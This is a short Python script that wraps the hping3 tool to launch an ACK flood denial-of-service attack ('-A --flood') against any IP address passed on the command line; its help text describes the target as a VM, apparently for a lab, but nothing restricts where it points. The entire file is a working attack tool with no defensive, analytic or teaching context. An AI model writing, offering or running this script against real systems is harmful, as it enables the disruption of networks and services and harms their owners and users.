import subprocess
import argparse

def run_hping3(target_ip):
    try:
        command = ["hping3", "-A", "--flood", target_ip]
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running hping3: {e}")
    except FileNotFoundError:
        print("Error: hping3 is not installed. Please install it and try again.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Run hping3 ACK flood attack on a target IP.")
    parser.add_argument("target_ip", help="The IP address of the target VM")
    args = parser.parse_args()
    
    run_hping3(args.target_ip)
